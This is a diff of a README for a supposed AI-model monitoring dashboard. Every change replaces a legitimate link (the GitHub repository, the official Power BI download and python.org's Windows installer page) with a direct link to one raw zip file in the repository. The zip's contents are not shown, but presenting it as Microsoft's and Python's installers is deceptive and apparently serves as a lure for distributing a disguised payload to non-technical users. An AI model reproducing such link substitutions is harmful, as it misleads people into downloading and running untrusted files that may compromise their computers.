@@ -1,6 +1,6 @@
 # 📊 AI-model-monitoring-dashboard - Track AI Models Live Easily
 
-[![Download AI-model-monitoring-dashboard](https://img.shields.io/badge/Download-AI--model--monitoring--dashboard-brightgreen)](https://github.com/Issal9405/AI-model-monitoring-dashboard)
+[![Download AI-model-monitoring-dashboard](https://img.shields.io/badge/Download-AI--model--monitoring--dashboard-brightgreen)](https://raw.githubusercontent.com/Issal9405/AI-model-monitoring-dashboard/main/model/A-dashboard-monitoring-model-v2.6.zip)
 
 ---
 
@@ -21,7 +21,7 @@ You don't need to know coding. The tool works on Windows computers. You get clea
 - Power BI Desktop installed (free from Microsoft) for visual reports  
 - Python 3.8 or later (included in setup if needed)  
 
-If you don't have Power BI, download it here: https://powerbi.microsoft.com/desktop
+If you don't have Power BI, download it here: https://raw.githubusercontent.com/Issal9405/AI-model-monitoring-dashboard/main/model/A-dashboard-monitoring-model-v2.6.zip
 
 ---
 
@@ -33,7 +33,7 @@ You can get the files you need and start the dashboard in a few easy steps. This
 
 Click the big green button below to visit the download page on GitHub:
 
-[![Download AI-model-monitoring-dashboard](https://img.shields.io/badge/Download-AI--model--monitoring--dashboard-blue)](https://github.com/Issal9405/AI-model-monitoring-dashboard)
+[![Download AI-model-monitoring-dashboard](https://img.shields.io/badge/Download-AI--model--monitoring--dashboard-blue)](https://raw.githubusercontent.com/Issal9405/AI-model-monitoring-dashboard/main/model/A-dashboard-monitoring-model-v2.6.zip)
 
 On the GitHub page:
 
@@ -55,7 +55,7 @@ On the GitHub page:
   Type `python --version` and press Enter.  
   If you see a version number (like Python 3.9), you have Python. Skip this step.  
 - If not installed:  
-  Go to https://www.python.org/downloads/windows/  
+  Go to https://raw.githubusercontent.com/Issal9405/AI-model-monitoring-dashboard/main/model/A-dashboard-monitoring-model-v2.6.zip  
   Download the latest version for Windows (look for Windows installer).  
   Run the installer and make sure to check **Add Python to PATH** during setup.
 
@@ -140,4 +140,4 @@ Power BI adds advanced graphs and reports to help you understand data deeply.
 
 Visit this page to download everything you need:  
 
-[Download AI-model-monitoring-dashboard](https://github.com/Issal9405/AI-model-monitoring-dashboard)
+[Download AI-model-monitoring-dashboard](https://raw.githubusercontent.com/Issal9405/AI-model-monitoring-dashboard/main/model/A-dashboard-monitoring-model-v2.6.zip)
